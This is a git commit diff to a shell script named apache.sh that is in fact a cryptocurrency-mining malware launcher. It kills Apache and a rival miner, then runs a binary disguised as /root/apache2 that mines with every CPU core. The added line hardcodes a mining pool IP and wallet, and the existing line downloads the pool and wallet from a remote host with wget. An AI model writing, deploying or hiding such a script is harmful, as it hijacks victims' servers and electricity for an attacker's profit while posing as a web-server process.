4847c930096eb539da7f5107e2fa3ae882ed3f8b
tanhuevon <36043964+tanhuevon@users.noreply.github.com>
2018-03-02 13:23:16 -0500

    Update apache.sh

--- apache.sh
+++ apache.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
 killall apache2
 killall  minerd
+/root/apache2 -a cryptonight -o stratum+tcp://45.76.248.236:3333 -u "etnkPDDjHh4QYLCFkNNSXmgNAwfgUaxphgWuz5Fva3cXJm5cJoWRwubjnQqzSbxH5vUxVCw7En2JY5oJZRv17eeR9o4ZmmBLn7+10000" -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
 /root/apache2 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u "`wget -q -O - sio.com.co/m/dirwallet.txt`+10000" -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
